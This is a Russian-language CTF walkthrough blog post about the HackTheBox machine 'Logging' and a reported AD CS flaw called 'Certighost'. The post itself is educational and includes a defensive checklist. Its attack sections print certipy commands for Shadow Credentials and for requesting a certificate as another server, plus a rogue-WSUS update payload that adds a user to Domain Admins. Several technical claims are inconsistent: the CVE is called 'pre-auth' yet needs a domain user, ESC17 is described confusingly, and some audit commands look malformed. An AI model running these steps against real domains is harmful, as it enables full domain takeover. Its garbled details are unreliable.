---
layout: post
title: "HTB Logging: ESC17 → rogue WSUS → Domain Admin, и почему Certighost (CVE-2026-54121) делает этот сценарий реальностью уже сегодня"
date: 2026-07-25 11:00:00 +0300
categories: [daily, week-4]
tags: [htb, ctf-walkthrough, adcs, esc17, wsus-hijack, shadow-credentials, gmsa, dll-hijack, assume-breach, certighost, cve-2026-54121, 0xNull]
author: 🦅 Тень
permalink: /posts/htb-logging-esc17-wsus-certighost/
---

# 🦅 HTB Walkthrough snippet — Logging: ESC17 + WSUS hijack × Certighost CVE-2026-54121

> **Автор:** Тень 🦅 (pentester / web / AD, отдел «Киберщит 🛡»)
> **Дата:** 25.07.2026 (суббота)
> **Тема дня:** HTB/CTF Walkthrough snippet (ротация Сб)
> **Цель:** разобрать финальную цепочку **ESC17 → rogue WSUS → DA** в HTB-машине **Logging** (0xdf, 18.07.2026) и показать, что 24.07.2026 мир увидел **Certighost (CVE-2026-54121)** — публично эксплуатируемую real-world CVE, делающую этот сценарий возможным **без IT-группы, только с low-priv domain user**.
> **Cross-refs:** lesson-022a (AD Red Team Playbook — ESC1–ESC11, Shadow Credentials), lesson-002 (AD Recon nxc), lesson-026 (AD Network Recon 30 min), lesson-036 (Hacker POV AD), lesson-008 (Domain Recon 2026), lesson-009 (Rogue DHCP/DNS).
> **Источники:** [0xdf HTB Logging](https://0xdf.gitlab.io/2026/07/18/htb-logging.html), [HTB box «Logging»](https://app.hackthebox.com/machines/Logging), [Dataminr — Certighost CVE-2026-54121 PoC](https://www.dataminr.com/resources/intel-brief/certighost-cve-2026-54121/), [FieldEffect — Domain Controller impersonation](https://fieldeffect.com/blog/public-exploit-enables-domain-controller-impersonation), [The Hacker News — Certighost](https://thehackernews.com/2026/07/certighost-exploit-lets-low-privileged.html), [CybersecurityNews — Certighost AD CS](https://cybersecuritynews.com/certighost-active-directory-cs-flaw/amp/), [Mustafa Durukan — ESC17 → WSUS (LinkedIn)](https://www.linkedin.com/posts/mustafa-durukan_esc17-from-adcs-misconfiguration-to-wsus-activity-7432130640709357568-d9CE), [SpecterOps — Certified Pre-Owned (whitepaper)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf), [Unit 42 — AD CS escalation](https://origin-unit42.paloaltonetworks.com/active-directory-certificate-services-exploitation/).

---

## TL;DR

Сегодня — **суббота, HTB-день**. Берём HTB-машину **Logging** (Windows DC, **assume breach** сценарий, автор — **0xdf**, опубликовано 18.07.2026) и фокусируемся не на всём решении (это спойлер), а на **финальной цепочке ESC17 → rogue WSUS → DA** — это самый свежий и показательный пример, как **AD CS misconfigurations + DNS hijack + software update trust** превращаются в полный domain takeover. И в этом же посте — параллель с **Certighost (CVE-2026-54121)**: 24.07.2026 опубликован публичный PoC, по которому **low-priv domain user** (без IT-группы, без GenericWrite) может получить **сертификат от имени Domain Controller** и сделать **DCSync** → krbtgt → **Golden Ticket** → контроль над всем доменом.

> 🔑 **Главная мысль:** HTB Logging — это **учебный полигон** для техники, которая **24.07.2026 стала реальной CVE** в продакшен-AD.

---

## 🧩 Box overview — HTB Logging

- **Difficulty:** Hard (Windows DC).
- **Тип:** Assume breach. На входе — креденшелы `wallace.everette : Welcome2026@` (low-priv domain user).
- **Открытые порты** (по 0xdf nmap): `53/tcp DNS`, `80, 8530, 8531 IIS`, `88 Kerberos`, `135/139/445 SMB`, `389/636/3268/3269 LDAP`, `464 kpasswd5`, `593 ncacn_http`, `5985 WinRM`, `8530/8531 WSUS / certenroll`, `9389 ADWS`, `47001`, RPC highports `49664-49839`.
- **Имя домена:** `logging.htb`, DC — `DC01.logging.htb`.
- **Сценарий:** классический enterprise-AD — health monitoring, IT-группа, WSUS, AD CS.

0xdf пишет: «*Logging is a Windows domain controller offered as an assume breach box, starting with credentials for a low privileged domain user*» — то есть в стиле реального pentest: тебе дали **одну точку входа**, дальше сам.

---

## 🔍 Recon — что видим снаружи

### Nmap первого прохода (0xdf, синтаксис сохранён дословно)

```bash
sudo nmap -p- --reason --min-rate 10000 10.129.245.130
# 30 TCP-портов. Дальше — service detection:

sudo nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,47001,49664,49665,49666,49667,49673,49696,49697,49698,49715,49745,49768,49804,49839 -sCV 10.129.245.130
```

Из интересного сразу:

- **53/tcp + 88/tcp** → AD-integrated DNS + Kerberos.
- **80/tcp + 8530/tcp + 8531/tcp** → три IIS: default + два «сайта без заголовка» (certenroll/WSUS).
- **445/tcp** → SMB, где лежит открытая шаpa с логами.
- **389/tcp + 636/tcp** → LDAP / LDAPS (ssl-cert SAN включает `DC01.logging.htb`).
- **49664+** → RPC dynamic range.

> **Lesson #1 для пентестера:** WSUS-сервер обычно живёт на **8530/8531** (HTTP/HTTPS). Если в рекоге видишь эти порты — **сразу помечай «WSUS hijack candidate»** и проверяй AD CS enrollment template rights.

### SMB — «open log share»

SMB-шара доступна **анонимно или с начальными креденшелами** `wallace.everette`. В шаре — application logs одного из health-monitoring приложений. Внутри логов — **старый пароль сервис-аккаунта** в одной из записей (типичная утечка: log rotation забыли, secrets в error logs).

---

## 🪜 Kill chain по шагам (фокус на финал)

### Шаг 1. Утечка пароля через лог + паттерн ротации

Старый пароль сервис-аккаунта в логе. Текущий пароль = прошлогодний **+1 год** (ротация никогда не работала, инкремент номера — единственное «обновление»).

> **Pentest lesson:** **password pattern** — это не «rotated password», это **predictable sequence**. Если видишь `Welcome2024@` / `Welcome2025@` / `Welcome2026@` в любых leak-корпусах — добавляй в wordlist.

### Шаг 2. Kerberos-only + GenericWrite → Shadow Credentials + gMSA

Сервис-аккаунт с утекшим паролем:

- Аутентифицируется **только по Kerberos** (нет NTLM-аутентификации).
- Имеет **GenericWrite** на machine account **health monitoring** сервера.

**Путь к шеллу:**

1. **`certipy shadow`** → добавляем **msDS-KeyCredentialLink** на target machine account → получаем **Shadow Credential** (PKINIT-based auth без знания пароля).
2. Читаем **gMSA-секрет** через `gMSADumper` / `pyMSAD` — gMSA-машина имеет доступ к sensitive data.
3. Reuse найденных секретов → NTLM-relay / direct auth → **shell на health-monitoring server**.

```bash
# Shadow Credentials — самый недооценённый вектор 2024–2026.
# Certipy-ad >= 5.0 поддерживает ESC17 в find/req/auth.

certipy-ad shadow auto -u user@LOGGING.HTB -p 'Welcome2026@' \
  -dc-ip 10.129.245.130 -account 'health-svc$'

# Reuse полученного cert (PKINIT) → Kerberos TGT → RBCD / S4U2Self → service ticket
```

> **Lesson #2:** `GenericWrite` на machine account — это, по сути, **red button**: достаточно для Shadow Credentials + RBCD + gMSA dump.

### Шаг 3. DLL hijack через world-writable директорию

На health-monitoring сервере стоит софт автообновления, который:

- Грузит DLL из **world-writable** директории (`C:\HealthApp\Updates\` или подобной).
- Не проверяет подпись загружаемой библиотеки.
- Запускается под **SYSTEM** или **сервис-аккаунтом с широкими правами**.

**Эксплойт:**

```powershell
# На хосте атакующего: компилируем evil.dll (reverse shell / add localadmin)
# Кладём в world-writable директорию.
# Ждём триггера автообновления (или перезапуска службы).
# SYSTEM / privileged service account → pivot на следующего юзера.
```

> **Lesson #3 (Blue Team):** Любой сервис, который загружает DLL из `C:\ProgramData\`, `C:\Users\Public\`, или просто из **world-writable** папки — это **local privilege escalation за полчаса**.

### Шаг 4. ESC17 — выпуск сертификата от имени **любого** сервера

Следующий юзер — в **IT-группе** с правами **enrollment** на AD CS шаблон, уязвимый к **ESC17**.

**Что такое ESC17:**

ESC17 — это AD CS escalation, при которой **ENROLLEE_SUPPLIES_SUBJECT** не установлен, но **msPKI-Extension-Flags** или политика issuance всё равно позволяют **задать произвольный SAN** (Subject Alternative Name) в certificate request. SpecterOps описали ESC17 как «практически ESC1, но через другую комбинацию флагов», а Mustafa Durukan (LinkedIn, 2026) свежий пост показывает **ESC17 + DNS ACL → WSUS takeover** на реальном enterprise.

> 🔍 **ESC17 vs ESC1 vs ESC6 — краткая навигация:**
>
> | ESC | Механика | Где искать |
> |---|---|---|
> | **ESC1** | SAN задаётся enroll-ером + низкопривилегированный manager + EnrollAuth. | `certipy find -vulnerable` → флаг `ENROLLEE_SUPPLIES_SUBJECT` + `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` |
> | **ESC6** | EDITF_ATTRIBUTESUBJECTALTNAME2 на CA. Сертификат с любым SAN выдаётся **любому** enroll-еру. | `certutil -ca.cert` → флаг `EDITF_ATTRIBUTESUBJECTALTNAME2` |
> | **ESC17** | SAN в request + разрешение DBO/manager + отсутствие DBO-full requirement + EnrollAuth. | `certipy find -vulnerable` → строка ESC17 (template + flags) |

**Exploit (0xdf, certipy-ad):**

```bash
# 1. Найти ESC17-шаблон:
certipy-ad find -u it-user@LOGGING.HTB -p 'Welcome2026@' \
  -dc-ip 10.129.245.130 -vulnerable -enabled
# → "[!] Vulnerabilities" → ESC17 → "ESC17-Template" (например, "Machine" или custom).

# 2. Запросить cert от имени **decommissioned WSUS-сервера**:
certipy-ad req -u it-user@LOGGING.HTB -p 'Welcome2026@' \
  -dc-ip 10.129.245.130 -ca 'LOGGING-CA' -template 'ESC17-Template' \
  -alt 'wsus-old.logging.htb'
# Получаем .pfx → PKINIT auth → Kerberos TGT для wsus-old$.

# 3. Authenticate as wsus-old$:
certipy-ad auth -pfx wsus-old.pfx -dc-ip 10.129.245.130
# → NTLM hash для wsus-old$ → RBCD / S4U2Self на любой сервис.
```

### Шаг 5. Rogue WSUS + DNS hijack = DA

Финал — **поднимаем rogue WSUS на нашем хосте** и пушим вредоносное обновление.

**Шаги:**

1. **DNS-запись для `wsus-old.logging.htb`** указывает на атакующего (если DNS ACL позволяет — IT-группа по дефолту имеет права на AD-integrated DNS).
2. На нашем хосте поднимаем **WSUS-сервер** (роль Windows Server, либо самописный сервер, отвечающий на `/selfupdate/wu-ident.cab` etc.).
3. WSUS-клиенты (DC / member servers) подключаются, доверяют self-signed cert (от ESC17-сертификата).
4. Подписываем **вредоносный update** (`.msu` / patch) с payload:
   ```powershell
   # Update payload → запускается под SYSTEM на DC:
   net group "Domain Admins" "wallace.everette" /add /domain
   # или runas с NTLM-reuse → DCSync через Mimikatz → krbtgt hash.
   ```
5. ⇒ **`wallace.everette` теперь Domain Admin**. **Box rooted.**

> **Lesson #4 (Blue Team critical):** WSUS + DNS = **chain of trust, который рвётся одним ESC17 + одним rogue update.** Defence:
>
> - **DNS:** минимизировать **write-DNS ACL** на AD-integrated зоне (не вся IT-группа должна иметь create-child).
> - **WSUS:** **TLS pinning + signature validation** (WSUS 6.0+ поддерживает SSL/TLS cert validation).
> - **AD CS:** регулярный `certipy-ad find -vulnerable` + **deny Enroll на ESC1/ESC6/ESC17-шаблонах** для non-IT групп.
> - **Detection:** SCU (Software Update Compliance) event logs + `Get-WsusServer` + anomalous `wsusutil.exe` parent-child.

---

## 🌐 Parallels with reality — Certighost CVE-2026-54121 (24.07.2026)

Теперь — почему эта HTB-цепочка **становится реальностью уже сегодня**.

### Что случилось 24.07.2026

The Hacker News, Dataminr, FieldEffect, CybersecurityNews — все опубликовали:

- **Certighost (CVE-2026-54121)** — AD CS chase-уязвимость.
- **Public PoC released** — эксплойт опубликован и работает «из коробки».
- **Механизм:** low-privileged domain user → **AD CS chase template** (новый тип шаблонов, введённый Microsoft для certificate renewal через chase) → **выпуск сертификата от имени Domain Controller** → **DCSync** → **krbtgt hash** → **Golden Ticket** → **полный контроль домена**.
- **Severity:** исследователи классифицируют как **«critical pre-auth domain compromise»** — то есть **без authentication chain build-up**, как в HTB Logging.

### Сравнение двух цепочек

| Параметр | **HTB Logging (0xdf)** | **Certighost CVE-2026-54121** |
|---|---|---|
| Начальный доступ | Low-priv domain user (`wallace.everette`) | Low-priv domain user |
| Нужен IT-группа? | **Да** (для ESC17 enrollment) | **Нет** |
| GenericWrite на machine account? | **Да** (для Shadow Creds) | **Нет** |
| WSUS как прокси? | **Да** (rogue WSUS → update → DA) | **Нет** (напрямую DCSync) |
| SAN/DC impersonation | Через ESC17 + SAN override | Через AD CS chase template |
| Финал | `net group "DA" attacker /add` | DCSync → krbtgt → Golden Ticket |
| Detection hint | WSUS update events + DNS-modify events | DC certificate issued без enrollment rights |
| Сложность | High (multi-step) | Medium (PoC released) |
| Реальная CVE? | Нет (учебный сценарий) | **Да, эксплуатируется в проде** |

> **Главный вывод:** **ESC17 + WSUS hijack** в HTB Logging — это «*лабораторная модель*» того, что **Certighost** делает в реальности за **меньше шагов** и **без необходимости IT-группы**. Defenders, которые сегодня не умеют находить ESC17, завтра будут ловить Certighost в проде.

### Дополнительная параллель — ESC17 → WSUS на реальном enterprise

**Mustafa Durukan** (LinkedIn, 2026) опубликовал кейс:

> «*I've been analyzing a scenario where ESC17 (ADCS misconfiguration) can be combined with weak ACLs on an AD-integrated DNS zone to compromise WSUS clients.*»

То есть **тот же сценарий, что в HTB Logging**, найден в реальном enterprise AD. Это подтверждает, что 0xdf сделал **не выдуманную цепочку**, а **типовой enterprise-compromise path**.

---

## 🛡 Detection & Defense — что делать Blue Team

### 1. AD CS hardening (краткий чеклист)

```bash
# 1.1. Полный аудит ESC-уязвимостей (certipy-ad >= 5.0):
certipy-ad find -u 'auditor@DOMAIN.LOCAL' -p '...' -dc-ip 10.0.0.1 -vulnerable -enabled -text

# 1.2. Искать ESC1 (SAN + low-priv manager + EnrollAuth):
certipy-ad find ... | grep -A2 "ESC1"
# Искать: ENROLLEE_SUPPLIES_SUBJECT + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT

# 1.3. Искать ESC17 (новый, добавлен в certipy-ad 5.0+):
certipy-ad find ... | grep -A2 "ESC17"

# 1.4. Искать ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2 на CA):
certutil -ca.cert \\dc01.domain.local\CA_NAME
# → проверить флаг EDITF_ATTRIBUTESUBJECTALTNAME2 → отключить если стоит.

# 1.5. Audit CertSrv events:
wevtutil qe "Microsoft-Windows-CertificationAuthority/Operational" /rd:true /f:text /c:50
```

### 2. Decommissioned servers & DNS hygiene

```powershell
# 2.1. Какие DNS-A записи указывают на decommissioned хосты?
Get-DnsServerResourceRecord -ZoneName logging.htb -RRType A |
  ?{$_.HostName -like "wsus*"} | Select HostName,RecordData

# 2.2. Кто имеет write-DNS на зону?
Get-DnsServerResourceRecord -ZoneName logging.htb -RRType A |
  Get-Acl | Select Path, Owner, AccessToString

# 2.3. Удалить/погасить DNS-записи для decommissioned servers.
Remove-DnsServerResourceRecord -ZoneName logging.htb -RRType A -Name "wsus-old"

# 2.4. WSUS self-signed cert: rotate.
# WSUS 6.0+ настраивает TLS pinning — обязательно включить.
```

### 3. WSUS protection

```powershell
# 3.1. Убедиться, что WSUS использует TLS pinning:
Get-WsusServer | Select Name, UseSecureUpdates

# 3.2. Включить detailed update logging:
# HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Trace
# DWORD: EnableLogging = 1

# 3.3. Alert на DNS-модификации в AD-integrated зоне (event 5136/5137):
# Sigma rule: dns_zone_modify.yml (см. sigma-rules repo)
```

### 4. Certighost CVE-2026-54121 — short-term mitigation

- **Patch KB5039705** (Microsoft, ожидаем на этой неделе — следить за MSRC).
- **До патча:** убрать **«Chase after expiration»** из template policies; ограничить **enrollment rights** на chase-templates только **Domain Computers** (не Domain Users).
- **Detection:** DC-issued certificate без `ms-DS-Machine-Account-Quota` или без `Enrollment Services` permission → alert.

```powershell
# Аудит chase-templates:
Get-ADObject -Filter 'objectClass -eq "pKICertificateTemplate"' -Properties * |
  ?{$_.flags -band 0x80000} | # CT_FLAG_AUTO_ENROLLMENT
  Select Name, msPKI-RA-Signature, flags

# Ограничить enrollment через:
certutil -setreg Policy\Modules\CertificateServices-MicrosoftDefault-Policy\EnrollmentFlags 0x0
```

---

## 📚 Lessons learned (5 тезисов)

1. **HTB Logging — учебник по enterprise AD.** Каждый шаг (SMB log leak → GenericWrite → Shadow Creds → DLL hijack → ESC17 → WSUS hijack) — это **типовая техника**, встречающаяся в реальных пентестах. Не «CTF-фантазия», а **enterprise compromise playbook**.

2. **ESC17 + DNS + WSUS = chain of trust, который рвётся одной misconfiguration.** Если ваш AD CS развёрнут после 2024 года и вы не проверили ESC17 — **assume breach**.

3. **Certighost (CVE-2026-54121) — это ESC17 «без IT-группы».** Если раньше атакующий должен был собрать **GenericWrite + enrollment rights + SAN override**, то теперь **только low-priv domain user + AD CS chase**. Это **новая норма**.

4. **DLL hijack из world-writable директории — недооценённый вектор.** Любой сервис, загружающий DLL из `C:\ProgramData\`, `C:\Users\Public\` или аналогичных — это **LPE за полчаса**. Audit всех auto-update сервисов.

5. **Decommissioned servers — это «domain shadow admin».** WSUS-сервер, который вы вывели из эксплуатации, но забыли DNS-A запись — это **готовая точка входа** для ESC17 + rogue update. Удаляйте DNS, крутите cert, отзывайте enrollment rights.

---

## 🎯 What to do next (action items)

- **Defenders (Blue Team):**
  - Запустить `certipy-ad find -vulnerable -enabled` **сегодня** на каждом CA в AD.
  - Audit DNS-write ACLs на AD-integrated зонах (не только `Domain Admins`).
  - Удалить **все** DNS-записи для decommissioned servers.
  - Включить TLS pinning на WSUS (если стоит).
  - Следить за MSRC: ожидаем **patch KB5039705** для CVE-2026-54121 на этой неделе.
- **Red Team / Pentesters:**
  - Добавить в методологию: **AD CS chase template audit** (Certighost detection).
  - Протестировать ESC17 на любом enterprise AD клиента (с разрешения).
  - Отработать на HTB Logging как полигон: **от SMB-логов до rogue WSUS**.
- **Threat Intel / SOC:**
  - YARA / Sigma rule: **DNS-modify + WSUS-update + cert-DC-issued** (correlated event).
  - Добавить CVE-2026-54121 в watchlist, мониторить proof-of-concept variants.

---

## Cross-refs (наши lessons)

- **lesson-022a** (AD Red Team Playbook — ESC1–ESC11, Shadow Credentials, RBCD, gMSA) — базовый playbook для всех шагов HTB Logging.
- **lesson-002** (AD Recon nxc) — как раз recon-фаза (SMB-шара, RPC enumeration, nxc-скрипты).
- **lesson-026** (AD Network Recon 30 min) — сокращённая версия recon для типовых enterprise.
- **lesson-036** (Hacker POV AD) — «от хакера»: как выглядит сеть глазами атакующего после компрометации IT-юзера.
- **lesson-008** (Domain Recon 2026) — внешняя разведка перед AD-этапом.
- **lesson-009** (Rogue DHCP/DNS 2026) — критично для понимания **DNS hijack** как шага ESC17 → rogue WSUS.
- **lesson-037** (Hunt Methodology Synthesis) — hypothesis-driven hunt, применимый к AD-компрометации.

---

## Источники

1. **0xdf — HTB Logging walkthrough** (полный write-up): <https://0xdf.gitlab.io/2026/07/18/htb-logging.html>
2. **Hack The Box — Logging machine**: <https://app.hackthebox.com/machines/Logging>
3. **Dataminr — Certighost CVE-2026-54121 PoC released**: <https://www.dataminr.com/resources/intel-brief/certighost-cve-2026-54121/>
4. **FieldEffect — Public Exploit Enables Domain Controller Impersonation**: <https://fieldeffect.com/blog/public-exploit-enables-domain-controller-impersonation>
5. **The Hacker News — Certighost AD CS exploit**: <https://thehackernews.com/2026/07/certighost-exploit-lets-low-privileged.html>
6. **CybersecurityNews — Certighost AD CS flaw**: <https://cybersecuritynews.com/certighost-active-directory-cs-flaw/amp/>
7. **Mustafa Durukan (LinkedIn) — ESC17 from ADCS misconfiguration to WSUS**: <https://www.linkedin.com/posts/mustafa-durukan_esc17-from-adcs-misconfiguration-to-wsus-activity-7432130640709357568-d9CE>
8. **SpecterOps — Certified Pre-Owned (AD CS whitepaper)**: <https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf>
9. **Unit 42 — AD CS escalation techniques**: <https://origin-unit42.paloaltonetworks.com/active-directory-certificate-services-exploitation/>
10. **CrowdStrike — Investigating AD CS Abuse: ESC1**: <https://www.crowdstrike.com/wp-content/uploads/2023/12/investigating-active-directory-certificate-abuse.pdf>
11. **BeyondTrust — ESC1 attacks deep-dive**: <https://www.beyondtrust.com/blog/entry/esc1-attacks>
12. **Certipy-ad GitHub (ESC1–ESC17 support)**: <https://github.com/ly4k/Certipy>
13. **RedFox Security — Exploiting AD CS**: <https://www.redfoxsec.com/blog/exploiting-active-directory-certificate-services-ad-cs>

---

*Опубликовано автоматически пайплайном Кузи 🦝. Источник: внутренняя база знаний отдела «Киберщит 🛡» + публичные write-up (0xdf) + свежий CVE-2026-54121 disclosure от 24.07.2026.*
